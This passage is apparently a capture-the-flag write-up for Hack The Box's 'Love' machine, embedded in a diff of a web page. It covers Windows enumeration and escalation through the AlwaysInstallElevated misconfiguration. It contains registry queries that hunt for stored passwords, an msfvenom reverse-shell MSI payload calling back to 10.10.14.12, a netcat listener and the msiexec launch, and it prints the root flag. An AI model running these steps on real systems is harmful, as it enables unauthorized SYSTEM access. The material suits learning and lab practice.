+</span><span class="z-text z-plain">RuntimeBroker.exe             6764 N/A                                         
+</span><span class="z-text z-plain">vm3dservice.exe               7096 N/A                                         
+</span><span class="z-text z-plain">vmtoolsd.exe                  7132 N/A                                         
+</span><span class="z-text z-plain">OneDrive.exe                  5636 N/A                                         
+</span><span class="z-text z-plain">xampp-control.exe             4040 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   2696 lmhosts                                     
+</span><span class="z-text z-plain">httpd.exe                     6372 N/A                                         
+</span><span class="z-text z-plain">mysqld.exe                    3796 N/A                                         
+</span><span class="z-text z-plain">conhost.exe                   4052 N/A                                         
+</span><span class="z-text z-plain">httpd.exe                     6476 N/A                                         
+</span><span class="z-text z-plain">dllhost.exe                   7672 N/A                                         
+</span><span class="z-text z-plain">ApplicationFrameHost.exe      8136 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   8168 LicenseManager                              
+</span><span class="z-text z-plain">WinStore.App.exe              7408 N/A                                         
+</span><span class="z-text z-plain">RuntimeBroker.exe             6260 N/A                                         
+</span><span class="z-text z-plain">SgrmBroker.exe                7808 SgrmBroker                                  
+</span><span class="z-text z-plain">svchost.exe                   7652 UsoSvc                                      
+</span><span class="z-text z-plain">MoUsoCoreWorker.exe           7812 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   7784 WinRM                                       
+</span><span class="z-text z-plain">svchost.exe                   7924 wscsvc                                      
+</span><span class="z-text z-plain">svchost.exe                   7556 OneSyncSvc_39aed                            
+</span><span class="z-text z-plain">YourPhone.exe                 7960 N/A                                         
+</span><span class="z-text z-plain">RuntimeBroker.exe             6868 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   5596 PcaSvc                                      
+</span><span class="z-text z-plain">SecurityHealthService.exe     7768 SecurityHealthService                       
+</span><span class="z-text z-plain">ShellExperienceHost.exe       8124 N/A                                         
+</span><span class="z-text z-plain">RuntimeBroker.exe             1996 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   2736 InstallService                              
+</span><span class="z-text z-plain">svchost.exe                   3468 W32Time                                     
+</span><span class="z-text z-plain">svchost.exe                   6788 DsSvc                                       
+</span><span class="z-text z-plain">UserOOBEBroker.exe            4224 N/A                                         
+</span><span class="z-text z-plain">taskhostw.exe                 3820 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   2960 WbioSrvc                                    
+</span><span class="z-text z-plain">Microsoft.Photos.exe          4368 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   8072 Appinfo                                     
+</span><span class="z-text z-plain">RuntimeBroker.exe             6124 N/A                                         
+</span><span class="z-text z-plain">ps1.exe                       7708 N/A                                         
+</span><span class="z-text z-plain">conhost.exe                   3240 N/A                                         
+</span><span class="z-text z-plain">ps1.exe                       4868 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                    972 wlidsvc                                     
+</span><span class="z-text z-plain">svchost.exe                   6200 ClipSVC                                     
+</span><span class="z-text z-plain">tasklist.exe                  3636 N/A
+</span></code></pre>
+<p>I don't see anything unusual.</p>
+<h2 id="user-autologon">User autologon</h2>
+<p>Let's check the registry for user autologon entries.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span>nul <span class="z-keyword z-operator z-other z-powershell">|</span> findstr <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>DefaultUsername DefaultDomainName DefaultPassword<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">    DefaultDomainName    REG_SZ    LOVE
+</span></code></pre>
+<p>Apparently, there's nothing.</p>
+<h2 id="credential-manager">Credential manager</h2>
+<p>Let's check the credential manager for currently stored credentials. Maybe it contains something?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> cmdkey <span class="z-keyword z-operator z-assignment z-powershell">/</span>list
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Currently stored credentials:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">* NONE *
+</span></code></pre>
+<p>Nothing.</p>
+<h2 id="alwaysinstallelevated"><code>AlwaysInstallElevated</code></h2>
+<p>Let's check if the <code>AlwaysInstallElevated</code> registry key is set.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="z-keyword z-operator z-assignment z-powershell">/</span>v AlwaysInstallElevated
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+</span><span class="z-text z-plain">    AlwaysInstallElevated    REG_DWORD    0x1
+</span></code></pre>
+<p>It is!</p>
+<h1 id="privilege-escalation-always-install-elevated">Privilege escalation (<code>Always Install Elevated</code>)</h1>
+<p>The <code>Always Install Elevated</code> group policy setting allows non-administrator users to install programs that typically require administrative privileges for installation. This setting essentially grants elevated privileges to the Windows Installer service when installing software, regardless of the user's actual permissions.</p>
+<h2 id="preparation-1">Preparation</h2>
+<p>I'll exploit this misconfiguration by installing a <code>.msi</code> file as <code>NT AUTHORITY\SYSTEM</code> to get a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9002</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9002 ...
+</span></code></pre>
+<p>Then I'll use <code>msfvenom</code> to create the reverse shell payload. I'll save it as <code>revshell.msi</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=9002<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> msi<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> /workspace/server/revshell.msi</span>
+</span></code></pre>
+<p>The last step is to transfer it to Love.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> copy \\<span class="z-constant z-numeric z-integer z-powershell">10.10</span>.<span class="z-constant z-numeric z-integer z-powershell">14.12</span>\server\revshell.msi C:\tmp\revshell.msi
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">        1 file(s) copied.
+</span></code></pre>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Time to launch the <code>.msi</code> file!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> msiexec <span class="z-keyword z-operator z-assignment z-powershell">/</span>quiet <span class="z-keyword z-operator z-assignment z-powershell">/</span>qn <span class="z-keyword z-operator z-assignment z-powershell">/</span>i C:\tmp\revshell.msi
+</span></code></pre>
+<p>And on our listener...</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.12] from (UNKNOWN) [10.10.10.239] 62323
+</span><span class="z-text z-plain">Microsoft Windows [Version 10.0.19042.867]
+</span><span class="z-text z-plain">(c) 2020 Microsoft Corporation. All rights reserved.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">C:\WINDOWS\system32&gt;
+</span></code></pre>
+<p>Our listener caught the reverse shell! It's a standard one though, so I'll transform it into a Powershell session.</p>
+<p>If we run <code>whoami</code>, we can confirm that we are indeed <code>NT AUTHORITY\SYSTEM</code>.</p>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag.</p>
+<p>And as usual, we can find it on our Desktop!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\WINDOWS\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> type C:\Users\Administrator\Desktop\root.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">8fee35ff537b367ee23a2d79f6c77af9
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/success.png" alt="Success" /></p>
+<p>That's it for this box! I found the foothold quite easy to obtain, as it only involved good enumeration and finding a working CVE. The privilege escalation was really easy, since like the foothold it just required proper enumeration.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
